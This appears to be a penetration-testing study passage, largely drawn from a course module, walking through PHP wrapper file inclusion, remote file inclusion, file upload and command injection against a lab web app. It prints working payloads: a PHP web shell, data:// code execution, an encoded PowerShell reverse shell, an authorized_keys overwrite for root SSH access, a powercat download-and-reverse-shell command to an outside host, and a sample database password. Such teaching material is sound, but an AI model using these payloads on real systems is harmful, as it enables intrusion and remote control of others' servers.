    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```

> Listing 23 - Decoding the base64 encoded content of admin.php

The decoded data contains _MySQL_[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/php-wrappers#fn6) connection information, including a username and password. We can use these credentials to connect to the database or try the password for user accounts via SSH.

While the **php://filter** wrapper can be used to include the contents of a file, we can use the **data://** wrapper to achieve code execution. This wrapper is used to embed data elements as plaintext or base64-encoded data in the running web application's code. This offers an alternative method when we cannot poison a local file with PHP code.

Let's demonstrate how to use the **data://** wrapper with the "Mountain Desserts" web application. To use the wrapper, we'll add **data://** followed by the data type and content. In our first example, we will try to embed a small URL-encoded PHP snippet into the web application's code. We can use the same PHP snippet as previously with **ls** the command.

```
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```

> Listing 24 - Usage of the "data://" wrapper to execute ls

Listing 24 shows that our embedded data was successfully executed via the File Inclusion vulnerability and **data://** wrapper.

When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the **data://** wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use **curl** to embed and execute it via the **data://** wrapper.

```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==


kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```

> Listing 25 - Usage of the "data://" wrapper with base64 encoded data

Listing 25 shows that we successfully achieved code execution with the base64-encoded PHP snippet. This is a handy technique that may help us bypass basic filters. However, we need to be aware that the **data://** wrapper will not work in a default PHP installation. To exploit it, the _allow_url_include_[7](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/php-wrappers#fn7) setting needs to be enabled.

##### Remote File Inclusion (RFI)

Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the **allow_url_include** option needs to be enabled to leverage RFI, just as with the **data://** wrapper from the previous section. As stated, it is disabled by default in all current versions of PHP. While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over _HTTP_[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/remote-file-inclusion-rfi#fn1) or _SMB_.[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/remote-file-inclusion-rfi#fn2) The included file is also executed in the context of the web application. Common scenarios where we'll find this option enabled is when the web application loads files or contents from remote systems e.g. libraries or application data. We can discover RFI vulnerabilities using the same techniques covered in the Directory Traversal and LFI sections.

Kali Linux includes several PHP _webshells_ in the **/usr/share/webshells/php/** directory that can be used for RFI. A webshell is a small script th
at provides a web-based command line interface, making it easier and more convenient to execute commands. In this example, we will use the **simple-backdoor.php** webshell to exploit an RFI vulnerability in the "Mountain Desserts" web application.

First, let's briefly review the contents of the **simple-backdoor.php** webshell. We'll use it to test the LFI vulnerability from the previous sections for RFI. The code is very similar to the PHP snippet we used in previous sections. It accepts commands in the _cmd_ parameter and executes them via the _system_ function.

```
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

> Listing 26 - Location and contents of the simple-backdoor.php webshell

To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. We can use the _Python3_[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/remote-file-inclusion-rfi#fn3) _http.server_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/remote-file-inclusion-rfi#fn4) module to start a web server on our Kali machine and serve the file we want to include remotely on the target system. The http.server module sets the web root to the current directory of our terminal.

We could also use a publicly-accessible file, such as one from Github.

```
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

> Listing 27 - Starting the Python3 http.server module

After the web server is running with **/usr/share/webshells/php/** as its current directory, we have completed all necessary steps on our attacking machine. Next, we'll use **curl** to include the hosted file via HTTP and specify **ls** as our command.

```
kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre>                        
```

> Listing 28 - Exploiting RFI with a PHP backdoor and execution of ls

Listing 28 shows that we successfully exploited an RFI vulnerability by including a remotely hosted webshell. We could now use Netcat again to create a reverse shell and receive an interactive shell on the target system, as in the LFI section.
##### File Upload Vulnerability
###### Using Executables files
- [ ] Find out if the application allows you to upload a file and see if you can upload a php shell and then execute a reverse shell payload. Depending on the target OS we may need to use a powershell reverse shell for windows or a bash onliner for linux.
Example:
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
###### Using Non-Executable Files

In this section, we'll examine why flaws in file uploads can have severe consequences even if there is no way for an attacker to execute the uploaded files. We may encounter scenarios where we find an unrestricted file upload mechanism, but cannot exploit it. One example for this is _Google Drive_,[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-upload-vulnerabilities/using-non-executable-files#fn1) where we can upload any file, but cannot leverage it to get system access. In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.

Let's begin to explore the updated "Mountain Desserts" web application by navigating to **http://mountaindesserts.com:8000**.

![Figure 18: Mountain Desserts Application on Windows](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/ea2633788230661f6a6b277258968f7f-cwa_fu_goupcom.png)

Figure 18: Mountain Desserts Application on Windows

We'll first notice that new version of the web application still allows us to upload files. The text also reveals that this version of the application is running on Linux. Furthermore, there is no _Admin_ link at the bottom of the page, and **index.php** is missing in the URL. Let's use **curl** to confirm whether the **admin.php** and **index.php** files still exist.

```
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
```

> Listing 36 - Failed attempts to access PHP files

Listing 36 shows that the **index.php** and **admin.php** files no longer exist in the web application. We can safely assume that the web server is no longer using PHP. Let's try to upload a text file. We'll start Burp to capture the requests and use the form on the web application to upload the **test.txt** file from the previous section.

![Figure 19: Text file successfully uploaded](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/ef90c45347a8b3927670c6f1d17fd758-cwa_fu_txtupcom.png)

Figure 19: Text file successfully uploaded

Figure 19 shows that the file was successfully uploaded according to the web application's output.

When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

Let's review the **test.txt** upload request in Burp. We'll select the POST request in _HTTP history_, send it to Repeater, and click on _Send_.

![Figure 20: POST request for the file upload of test.txt in Burp](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/0f3ac15c454bc8a783e1979ded24f48c-cwa_fu_burptxtcom.png)

Figure 20: POST request for the file upload of test.txt in Burp

Figure 20 shows we receive the same output as we did in the browser, without any new or valuable information. Next, let's check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the "filename" parameter in the request so it contains **../../../../../../../test.txt**, then click _send_.

![Figure 21: Relative path in filename to upload file outside of web root](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/09717aa19bfbb0fe03b6cab91643e9a7-cwa_fu_burprelcom.png)

Figure 21: Relative path in filename to upload file outside of web root

The _Response_ area shows us that the output includes the **../** sequences. Unfortunately, we have no way of knowing if the relative path was used for placing the file. It's possible that the web application's response merely echoed our filename and sanitized it internally. For now, let's assume the relative path was used for placing the file, since we cannot find any other attack vector. If our assumption is correct, we can try to blindly overwrite files, which may lead us to system access. We should be aware, that blindly overwriting files in a real-life penetration test could result in lost data or costly downtime of a production system. Before moving forward, let's briefly review web server accounts and permissions.

Web applications using _Apache_, _Nginx_ or other dedicated web servers often run with specific users, such as _www-data_ on Linux. Traditionally on Windows, the IIS web server runs as a _Network Service_ account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the _IIS Application Pool Identities_.[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-upload-vulnerabilities/using-non-executable-files#fn2) These are virtual accounts running web applications grouped by _application pools_.[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-upload-vulnerabilities/using-non-executable-files#fn3) Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.

When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as _root_ or _Administrator_ to avoid any permissions issues. This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.

Let's try to overwrite the **authorized_keys** file in the home directory for _root_. If this file contains the public key of a private key we control, we can access the system via SSH as the _root_ user. To do this, we'll create an SSH keypair with **ssh-keygen**,[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-upload-vulnerabilities/using-non-executable-files#fn4) as well as a file with the name **authorized_keys** containing the previously created public key.

```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```

> Listing 37 - Prepare authorized_keys file for File Upload

Now that the **authorized_keys** file contains our public key, we can upload it using the relative path **../../../../../../../root/.ssh/authorized_keys**. We will select our **authorized_keys** file in the file upload form and enable intercept in Burp before we click on the _Upload_ button. When Burp shows the intercepted request, we can modify the filename accordingly and press _Forward_.

![Figure 22: Exploit File Upload to write authorized_keys file in root home directory](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/commonwebattacks/999ddab4c6543dc3d727618bc14ed495-cwa_fu_burprelsshcom.png)

Figure 22: Exploit File Upload to write authorized_keys file in root home directory

Figure 22 shows the specified relative path for our **authorized_keys** file. If we've successfully overwritten the **authorized_keys** file of the _root_ user, we should be able to use our private key to connect to the system via SSH. We should note that often the _root_ user does not carry SSH access permissions. However, since we can't check for other users by, for example, displaying the contents of **/etc/passwd**, this is our only option.

The target system runs an SSH server on port 2222. Let's use the corresponding private key of the public key in the **authorized_keys** file to try to connect to the system. We'll use the **-i** parameter to specify our private key and **-p** for the port.

In the Directory Traversal Learning Unit, we connected to port 2222 on the host **mountaindesserts.com** and our Kali system saved the host key of the remote host. Since the target system of this section is a different machine, SSH will throw an error because it cannot verify the host key it saved previously. To avoid this error, we'll delete the **known_hosts** file before we connect to the system. This file contains all host keys of previous SSH connections.

```
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

> Listing 38 - Using the SSH key to successufully connect via SSH as the root user

We could successfully connect as _root_ with our private key due to the overwritten **authorized_keys** file. Facing a scenario in which we can't use a file upload mechanism to upload executable files, we'll need to get creative to find other vectors we can leverage.




#### Command Injection
Find a vulnerable parament that accepts commands. You may need to execute a legit and benign command first and then append you payload/command via ";" or "%3B"
Example:
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

> Listing 46 - Command to download PowerCat and execute a reverse shell

Again, we'll use URL encoding for the command and send it.

```
kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

> Listing 47 - Downloading Powercat and creating a reverse shell via Command Injection